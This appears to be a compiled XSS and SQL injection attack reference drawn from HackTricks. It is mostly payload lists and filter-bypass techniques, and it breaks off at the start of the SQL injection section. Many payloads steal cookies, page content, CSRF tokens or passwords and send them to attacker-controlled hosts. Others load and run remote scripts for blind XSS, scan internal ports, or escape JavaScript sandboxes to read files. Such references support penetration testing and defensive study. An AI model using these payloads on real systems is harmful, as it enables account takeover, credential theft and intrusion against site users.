# HackTricks XSS & SQLi Comprehensive Reference
## Extracted from HackTricks pentesting-web articles
### Generated: 2026-06-06

================================================================================
# PART 1: XSS (CROSS SITE SCRIPTING)
================================================================================

## 1. METHODOLOGY

### 1.1 Overall Flow
1. Check if any value you control (parameters, path, headers, cookies) is reflected or used by JS code
2. Find the context where it's reflected/used
3. If REFLECTED:
   a. Raw HTML: Can you create new tags? Use events/attributes? Bypass protections? Client-side template injection?
   b. Inside HTML tag: Can you exit to raw HTML? Create events? Does attribute support JS? Bypass protections?
   c. Inside JS code: Can you escape <script> tag? Escape string? In template literals? Bypass protections?
   d. JS function being executed: e.g. ?callback=alert(1)
4. If USED: Exploit DOM XSS - check sinks

### 1.2 Reflection Types
- Intermediately reflected → Reflected XSS
- Stored and reflected → Stored XSS
- Accessed via JS → DOM XSS

================================================================================

## 2. XSS CONTEXTS

### 2.1 Raw HTML
Your input is reflected directly in the HTML page. Use tags like `<img>`, `<iframe>`, `<svg>`, `<script>`.

Basic payloads:
```html
<script>alert(1)</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```

### 2.2 Inside HTML Tags / Attribute Value

#### Escape from attribute and tag:
```
"><img [...]
```

#### Escape from attribute but not from tag (create events):
```
" autofocus onfocus=alert(1) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x
```

#### Cannot escape from attribute (use attribute-specific abuse):
```
href="javascript:alert(1)"
" accesskey="x" onclick="alert(1)" x="
```

#### Style events:
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>
```

#### Invisible overlay click/Mouseover:
```html
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```

#### Attribute-only login XSS behind WAFs:
- WAF only inspects first JS statement in inline attributes
- Prefix with harmless expression in parens, then semicolon: `onfocus="(history.length);malicious_code_here"`
- Auto-trigger via fragment: `#forgot_btn` focuses element on page load
- Build strings without quotes using `String.fromCharCode`

```javascript
function toCharCodes(str){
  return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
```

#### HTML Encoding within Attributes (decoded at runtime):
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```

#### URL encode also works:
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```

#### Unicode encoding in event handlers:
```javascript
//Encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```

### 2.3 Special Protocols

#### javascript: protocol bypasses:
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //New line 
script:alert(1)
```

#### data: protocol:
```javascript
data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```

#### Places to inject javascript:/data: protocols:
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>
<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,..." type="image/svg+xml" AllowScriptAccess="always"></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>
//Special cases
<object data="//hacker.site/xss.swf">
<embed code="//hacker.site/xss.swf" allowscriptaccess=always>
<iframe srcdoc="<svg onload=alert(4);>">
```

#### URL encoding + HTML encoding inside javascript:
Even if your input inside `javascript:...` is URL encoded, it will be URL decoded before execution.

#### Hex and Octal encode inside iframe src:
```javascript
//Encoded: <svg onload=alert(1)>
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />
```

### 2.4 Inside JavaScript Code

#### Escape <script> tag:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Note: Browser parses HTML first, then JS. Single quote doesn't need closing.

#### Escape JS string:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```

#### JS-in-JS string break → inject → repair pattern:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
URL pattern: `?param=test";<INJECTION>;a="`

#### Template literals (backticks ``):
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

#### Encoded code execution:
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are necessary -->
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```

#### Base64 delivery (eval+atob) with Unicode escaping:
```javascript
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```

#### const/let scoping nuance:
`const`/`let` inside `eval()` are block-scoped. Use dynamically injected `<script>` for global hooks.

================================================================================

## 3. BLACKLIST BYPASSES (Raw HTML)

### 3.1 Random Capitalization:
```javascript
<ScrIpT>
<ImG
```

### 3.2 Double tag (if only first match removed):
```
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>
```

### 3.3 Space substitutes for attribute separation:
```
/
/*%00/
/%00*/
%2F  (URL encoded /)
%0D  (carriage return)
%0C  (form feed)
%0A  (newline)
%09  (tab)
```

### 3.4 Unexpected parent/weird tags:
```html
<svg><x><script>alert('1'&#41</x>
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>
```

### 3.5 Not closing tag:
```html
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //
```

### 3.6 Extra open:
```html
<<script>alert("XSS");//<</script>
```

### 3.7 Weird combinations:
```html
<</script/script><script>
<input type=image src onerror="prompt(1)">
onerror=alert`1`
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```

### 3.8 Custom tags + onfocus:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
End URL with `#` to focus on object.

### 3.9 Tags/Events brute-force:
Use https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- Copy tags to clipboard, brute force with Burp Intruder
- Then brute force events for valid tags

================================================================================

## 4. LENGTH BYPASS (Tiny XSS)

```html
<svg/onload=alert``>
<script src=//aa.es>
<script src=//℡㏛.pw>
```
Last one uses 2 unicode chars expanding to 5: telsr
More: https://github.com/terjanq/Tiny-XSS-Payloads

================================================================================

## 5. EVENT HANDLER BYPASSES

Chars allowed between event handler and "=":
- IE: %09 %0B %0C %020 %3B
- Chrome: %09 %20 %28 %2C %3B
- Safari: %2C %3B
- Firefox: %09 %20 %28 %2C %3B
- Opera: %09 %20 %2C %3B
- Android: %09 %20 %28 %2C %3B

```javascript
<svg onload%09=alert(1)> //No Safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>
```

================================================================================

## 6. XSS IN "UNEXPLOITABLE" TAGS

### 6.1 Hidden inputs:
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```

### 6.2 Meta tags:
```html
<meta name="apple-mobile-web-app-title" content="" Twitter popover id="newsletter" onbeforetoggle="alert(2)" />
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```

### 6.3 Accesskey trick:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
Payload: `" accesskey="x" onclick="alert(1)" x="`
Firefox: ALT+SHIFT+X, OS X: CTRL+ALT+X.

================================================================================

## 7. JS WITHOUT PARENTHESES

### 7.1 Via location:
```javascript
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
```

### 7.2 Backticks + Tagged Templates:
```javascript
alert`1`
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`
Function`x${'alert(1337)'}x`
```

### 7.3 .replace with regex:
```javascript
"a,".replace`a${alert}`
"a".replace.call`1${/./}${alert}`
"a".replace.call`1337${/..../}${alert}`
```

### 7.4 Reflect.apply:
```javascript
Reflect.apply.call`${alert}${window}${[1337]}`
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}`
```

### 7.5 valueOf/toString:
```javascript
valueOf=alert;window+''
toString=alert;window+''
```

### 7.6 Error handlers:
```javascript
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
throw onerror=alert,1337
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause
try{throw onerror=alert}catch{throw 1}
```

### 7.7 Has instance symbol:
```javascript
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
```

================================================================================

## 8. ARBITRARY FUNCTION CALL (Alert)

### 8.1 Eval-like functions:
```javascript
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')
```

### 8.2 General function executions:
```javascript
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
[alert][0].call(this,1)
(1,2,3,4,5,6,7,8,alert)(1)
globalThis[`al`+/ert/.source]`1`
```

================================================================================

## 9. JS BYPASS BLACKLISTS TECHNIQUES

### 9.1 Strings:
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```

### 9.2 Special escapes:
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
```

### 9.3 Space substitutions in JS:
```javascript
<TAB>
/**/
```

### 9.4 JS Comments:
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment (must be at beginning of line)
-->This is a 1 line comment (must be at beginning of line)
```

### 9.5 JS new lines:
```javascript
0x0a (\n)
0x0d (\r)
\u2028 (line separator)
\u2029 (paragraph separator)
```

### 9.6 JS whitespaces (all valid between function and ()):
```javascript
9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279
// HTML encode them in SVG/HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```

### 9.7 JS inside a comment - leak via sourceMappingURL:
```javascript
//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```

================================================================================

## 10. ANGULAR/CLIENT-SIDE TEMPLATE EXECUTION

```html
<div ng-app>
  <strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```

================================================================================

## 11. SPECIAL COMBINATIONS (Curated Payloads)

```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```

================================================================================

## 12. XSS WITH 302 HEADER INJECTION

Test protocols in Location header: `mailto://`, `//x:1/`, `ws://`, `wss://`, empty Location, `resource://`

================================================================================

## 13. PHP FILTER_VALIDATE_EMAIL BYPASS
```
"><svg/onload=confirm(1)>"@x.y
```

================================================================================

## 14. RUBY-ON-RAILS BYPASS
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```

================================================================================

## 15. VALID SCRIPT CONTENT-TYPES
```c
"application/ecmascript", "application/javascript", "application/x-ecmascript",
"application/x-javascript", "text/ecmascript", "text/javascript",
"text/javascript1.0"-"text/javascript1.5", "text/jscript", "text/livescript",
"text/x-ecmascript", "text/x-javascript"
```

### 15.1 Script Types:
- module (default)
- webbundle: Package data in .wbn files
- importmap: Remap module imports (can be abused to reroute eval)
- speculationrules: Pre-rendering rules

### 15.2 Content-Types that execute XSS:
- text/html
- application/xhtml+xml
- application/xml, text/xml
- image/svg+xml
- text/plain (?)
- application/rss+xml (off)
- application/atom+xml (off)

### 15.3 XML Content Type XSS:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>
```

================================================================================

## 16. DOM VULNERABILITIES

See DOM XSS page. Key sinks: `location.href`, `document.write`, `eval()`, `innerHTML`, etc.
DOM Clobbering attacks also covered.

### 16.1 Upgrading Self-XSS:
- Cookie XSS + Cookie Tossing across subdomains
- Sending session to admin
- Session Mirroring

================================================================================

## 17. OTHER BYPASSES

### 17.1 WASM Linear-Memory Template Overwrite:
Overwrite Emscripten/WASM HTML templates in linear memory via overflow to inject script handlers.

### 17.2 Normalized Unicode:
Check if reflected values are unicode normalized server/client side.

### 17.3 CSS Gadgets:
Use existing CSS classes/IDs to style injected elements for better mouse-related XSS.

================================================================================

## 18. OBFUSCATION & ADVANCED BYPASS

### 18.1 Tools/Resources:
- https://aem1k.com/aurebesh.js/
- https://github.com/aemkei/katakana.js
- https://javascriptobfuscator.herokuapp.com
- https://skalman.github.io/UglifyJS-online/
- http://www.jsfuck.com
- http://utf-8.jp/public/jjencode.html
- http://utf-8.jp/public/aaencode.html

### 18.2 JS with only: []`+!${}

================================================================================

## 19. XSS COMMON PAYLOADS

### 19.1 Retrieve Cookies:
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```

Note: HTTPOnly flag blocks JS access. See Cookie Tossing for bypasses.

### 19.2 Steal Page Content:
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
  if (xhr.readyState == XMLHttpRequest.DONE) {
    fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
  }
}
xhr.open("GET", url, true)
xhr.send(null)
```

### 19.3 Port Scanner (fetch):
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```

### 19.4 Port Scanner (websockets):
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
    var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
    s.start = performance.now();
    s.port = ports[i];
    s.onerror = function() { console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms"); };
    s.onopen = function() { console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms"); };
}
```
Short times = responding port.

### 19.5 Fake Login Credential Box:
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```

### 19.6 Auto-fill Password Capture:
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```

### 19.7 Hijack Form Handlers (const shadowing):
```javascript
const DoLogin = () => {
  const pwd  = Trim(FormInput.InputPassword.value);
  const user = Trim(FormInput.InputUtente.value);
  fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```

### 19.8 Steal CSRF Tokens:
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/email/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

### 19.9 Steal PostMessage Messages:
```html
<img src="https://attacker.com/?" id=message>
<script>
 window.onmessage = function(e){
 document.getElementById("message").src += "&"+e.data;
</script>
```

================================================================================

## 20. BLIND XSS PAYLOADS

```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- Self-executing focus event via autofocus -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- SVG onload -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- Video source onerror -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- onpageshow event -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- JQuery getScript -->
<script>$.getScript("//domain")</script>

<!-- <script> filtered - base64 -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- Autofocus bypass -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```

Use: https://xsshunter.com/ for blind XSS detection.

================================================================================

## 21. REGEX - ACCESS HIDDEN CONTENT

```javascript
flag = "CTF{FLAG}"
re = /./g
re.test(flag)
flag = ""  // value removed
// Still accessible via:
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"])
```

================================================================================

## 22. XSS ABUSING OTHER VULNERABILITIES

### 22.1 XSS in Markdown
### 22.2 XSS to SSRF (Edge Side Includes):
```python
<esi:include src="http://yoursite.com/capture" />
```

### 22.3 XSS in Dynamic PDF:
Inject HTML tags into PDF generation for Server-Side XSS.

### 22.4 XSS in Amp4Email:
AMP for Email extends AMP components to emails. Gmail example writeup available.

### 22.5 List-Unsubscribe Header Abuse:
Stored XSS via `javascript:` URIs:
```
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```

SSRF via server-side unsubscribe:
```
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```

### 22.6 SVG File Upload XSS:
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert(1);
   </script>
</svg>
-----------------------------232181429808--
```

Short SVG:
```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <script type="text/javascript">alert("XSS")</script>
</svg>
```

SVG with foreignObject/iframe:
```svg
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <circle cx="50" cy="50" r="45" fill="green" id="foo"/>
  <foreignObject width="500" height="500">
     <iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
     <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
  </foreignObject>
</svg>
```

SVG use element:
```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```

### 22.7 Chrome Cache to XSS
### 22.8 XS Jails Escape:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/)with(this)with(constructor)constructor(source)()
with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))

// import() when everything is undefined
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))

// arguments.callee.caller.arguments to access require
;(function () {
  return arguments.callee.caller.arguments[1]("fs").readFileSync("/flag.txt", "utf8")
})()
```

### 22.9 Supply-chain Stored XSS via backend JS concatenation
### 22.10 Stored XSS in generated reports (Django |safe)
### 22.11 Service Worker Abuse
### 22.12 Shadow DOM Access
### 22.13 Polyglots: https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt

================================================================================

## 23. XSS RESOURCES
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection
- http://www.xss-payloads.com
- https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt
- https://github.com/materaj/xss-list
- https://github.com/ismailtasdelen/xss-payload-list
- https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec
- https://netsec.expert/2020/02/01/xss-in-2020.html
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md
- https://github.com/terjanq/Tiny-XSS-Payloads
- https://github.com/allanlw/svg-cheatsheet
- https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt (brute force list)


================================================================================
# PART 2: SQL INJECTION
================================================================================

## 1. WHAT IS SQL INJECTION
Security flaw allowing attackers to interfere with database queries. Can view/modify/delete data, compromise server, cause DoS.

================================================================================

## 2. ENTRY POINT DETECTION

### 2.1 Escape from current context:
```
 [Nothing]
'
"
`
